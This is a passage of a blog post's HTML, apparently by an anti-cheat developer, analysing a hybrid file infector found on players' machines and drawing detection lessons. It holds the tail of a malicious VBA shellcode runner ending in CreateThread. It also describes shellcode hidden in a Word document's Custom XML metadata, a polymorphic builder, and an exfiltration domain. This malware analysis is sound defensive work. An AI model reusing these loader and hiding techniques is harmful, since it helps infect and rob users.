+</span></span><span class="line"><span class="cl">    <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+</span></span></code></pre></div><p>Shellcode, base64-encoded, stored in a Word document&rsquo;s <strong>Custom XML part</strong>. Not in the macro, not in the document body, but in a metadata stream most tools never open. Decoded with <code>MSXML2.DOMDocument</code>, allocated, marked executable, run on a thread.</p>
+<p>Look at <code>%slf%</code>, <code>%vn%</code> and <code>Sub %fn%()</code>. Those are template placeholders. The subroutine name, the object reference and the XML marker tag are all substituted per build. In the sample we have, <code>%vn%</code> had become <code>&lt;M0YV&gt;</code>. That is a builder, and it is where the polymorphism comes from.</p>
+<h3 id="the-author-left-a-note">The author left a note</h3>
+<p>In the VBA comments, in <strong>Esperanto</strong>:</p>
+<p><img src="/posts/anticheatfoundavirus/04-esperanto.png" alt="Esperanto comments in the VBA project"></p>
+<p>Translated:</p>
+<blockquote>
+<p><em>hey friend researcher, you are the first who has ever seen this technique in the wild</em>
+<em>you think you need to write a signature for this? I&rsquo;ll write polymorphic code tomorrow</em>
+<em>still, I think you&rsquo;ll find this code many years after the initial fully undetectable release</em>
+<em>because you&rsquo;d never expect a hybrid of a PE infector and a macro virus</em>
+<em>why am I so confident? Let&rsquo;s say this code is fairly easy to detect yet no AV engine scans VBA routines in this context</em>
+<em>and you are blind now, in the age of modern cybercrime</em></p>
+</blockquote>
+<p>He&rsquo;s right about the mechanism, and I&rsquo;ll give him the point: we had the file for two days and I closed it as &ldquo;just a repacked binary&rdquo;, because I was grepping for the markers of the <em>other</em> virus. A PE infector that carries a macro virus that carries shellcode in document metadata is not a combination anyone&rsquo;s pipeline is shaped for.</p>
+<p>Elsewhere in the same project there is a second block of Esperanto. This one isn&rsquo;t a taunt:</p>
+<blockquote>
+<p><em>But don&rsquo;t forget your worth: it is not in a signature, but in your living heart.</em>
+<em>Who strives to suffocate all the creativity of our civilisation …</em>
+<em>if someone replaces you with an AI, that would shock me.</em>
+<em>Rename the signature to &ldquo;FuckIndustry&rdquo; already, and I&rsquo;ll know</em>
+<em>maybe I&rsquo;ll be the only one who understands you then.</em>
+<em>Put the detection signature in, do what you must, and I&rsquo;ll do my duty, just as I strive.</em>
+<em>That you can take it apart with your living thought, and teach others to resist the risks of an artificial mind.</em>
+<em>My friend, I&rsquo;ll show compassion, and never forget, even (eax, ebx, etc… lol) when everyone else has abandoned you completely.</em></p>
+</blockquote>
+<p>Somebody wrote a multi-stage file infector, then used the comment field to worry about reverse engineers being replaced by machines. Make of that what you want.</p>
+<p>One rule fired on two players and turned up two unrelated pieces of malware: a fourteen-year-old DLL infector, and a hybrid I can&rsquo;t find any public description of. The rule was right both times and sufficient neither time. &ldquo;This file isn&rsquo;t ours&rdquo; is where the investigation starts.</p>
+<h2 id="anti-cheat-is-antivirus-whether-you-meant-it-or-not">Anti-cheat is antivirus, whether you meant it or not</h2>
+<p>Once you ship something that enumerates modules, hashes files, inspects handles and watches drivers, you have written an endpoint security product. Your users will not care about the distinction, and neither will the threats.</p>
+<p>The big vendors stopped pretending about this a while ago. Riot, announcing Vanguard On-Demand in June 2026, put it plainly:</p>
+<blockquote>
+<p>&ldquo;Damn near a third of Vanguard&rsquo;s functionality is built around policing vulnerable drivers&rdquo; … &ldquo;<strong>Cheating isn&rsquo;t so different from malware.</strong>&rdquo;
+Source: <a href="https://www.riotgames.com/en/news/vanguard-on-demand">riotgames.com</a></p>
+</blockquote>
+<p>Epic&rsquo;s Easy Anti-Cheat documentation on blocked drivers:</p>
+<blockquote>
+<p>&ldquo;Vulnerable drivers are frequently used by malware and cheats.&rdquo; … &ldquo;What is our criteria for finding what driver is vulnerable or not? <strong>We use the Microsoft blocklist.</strong>&rdquo;
+Source: <a href="https://eoshelp.epicgames.com/s/article/Why-are-certain-drivers-blocked-by-Easy-Anti-Cheat?language=en_US">eoshelp.epicgames.com</a></p>
+</blockquote>
+<p>That is an anti-cheat consuming the same threat intelligence feed as every EDR product on the market. And BattlEye&rsquo;s FAQ is even more direct about where this ends up:</p>
+<blockquote>
+<p>&ldquo;Sometimes BE might block malware/adware/PUP files… We recommend Malwarebytes Anti-Malware for removing such software from your system.&rdquo;
+Source: <a href="https://www.battleye.com/support/faq/">battleye.com</a></p>
+</blockquote>
+<p>Epic&rsquo;s public violation enum includes <code>EOS_ACCVT_UnknownGameFileForbidden</code> (&ldquo;a disallowed game file <strong>addition</strong> was detected&rdquo;), alongside <code>GameFileMismatch</code> and <code>ForbiddenModuleLoaded</code>. Our own rule is, almost word for word, a value in Epic&rsquo;s SDK. We reinvented it without knowing, because if you take integrity seriously there is only one place to arrive.</p>
+<p>The overlap runs both ways, and it gets awkward. EA&rsquo;s published Javelin driver denylist includes Kaspersky&rsquo;s <code>klhk.sys</code>, MalwareFox, and Sysinternals&rsquo; Process Explorer. Riot&rsquo;s Vanguard blocked <code>WinRing0</code> in 2020; Microsoft Defender started flagging the same driver as <code>HackTool:Win32/Winring0</code> in 2025. The anti-cheat reached the antivirus verdict five years early.</p>
+<h2 id="what-this-means-if-you-build-one">What this means if you build one</h2>
+<p><strong>Your flags are leads, not verdicts.</strong> That rule fired on two players. Both were infected, by two unrelated families, and neither was cheating. If we had banned on the flag we&rsquo;d have punished two victims and learned nothing about either.</p>
+<p><strong>Base rates before accusations.</strong> We have a rule for <code>gdrv3.sys</code>, a Gigabyte driver with a well-known kernel read/write hole. It has fired on <strong>3,509 accounts</strong>, because it also ships with fan and RGB utilities. It is noise. A detection that matches thousands of ordinary machines is not a detection, it&rsquo;s a population statistic. We measure every rule against the whole fleet before anyone is allowed to act on it.</p>
+<p><strong>Build sample collection before you need it.</strong> The entire investigation above exists because we could get the file at all. A detection you can&rsquo;t follow up on is a line in a table.</p>
+<p><strong>Hashes lose to polymorphism.</strong> Floxif gave us five hashes in three days at one constant size. The second sample came from a builder that substitutes its macro&rsquo;s subroutine name, object reference and XML marker on every build. If you match digests you are permanently one sample behind. What identified Floxif was <em>structure</em>: a zeroed relocation directory, a five-byte entry-point patch, a length-prefixed XOR blob in the overlay, and a size delta repeating across three unrelated files.</p>
+<p><strong>Look past the layer you expected.</strong> I had the second file for two days and closed it as a repacked binary, because I searched it for the markers of the first virus and found none. It took a PNG that was a DLL, a DLL that carried a Word document, and a Word document with shellcode in its Custom XML metadata. If your triage is &ldquo;does it match the thing I already know&rdquo;, you will close exactly the samples worth keeping open.</p>
+<p><strong>Collect more than you think you need, and consume what you collect.</strong> The second infected machine was invisible to every file-based check we had. We found it in the DNS cache and the loaded-module list: two frames we collect on every snapshot and had written exactly zero rules against. Breadth of telemetry beat depth of analysis, and the frame that saved us was one nobody had ever queried.</p>
+<p><strong>Plan for the player being the victim.</strong> We spent a day building a ban case against someone whose real problem was that his RDP credentials were being exfiltrated to <code>aieov.com</code>. He didn&rsquo;t need a ban. He needed a message explaining that his machine was infected, which files to delete, and that he should change his passwords.</p>
+<p><strong>Your install directory is an attack surface for someone else&rsquo;s malware.</strong> We don&rsquo;t code-sign our binaries. Most private servers don&rsquo;t. Floxif infects any <code>.dll</code>, <code>.ocx</code> or <code>.exe</code> outside <code>%WINDIR%</code> that it can reach, and a game folder full of unsigned DLLs is an easy target. If your patcher ever uploads, mirrors, or peer-distributes client files, think carefully about what happens when one of those files is infected on the way in.</p>
+<p><strong>And read the prior art.</strong> Fourteen years.</p>
+<hr>
+<p><em>Thanks for reading.</em></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/3r4y" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/abakidev" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2026 Eray.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://3r4y.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
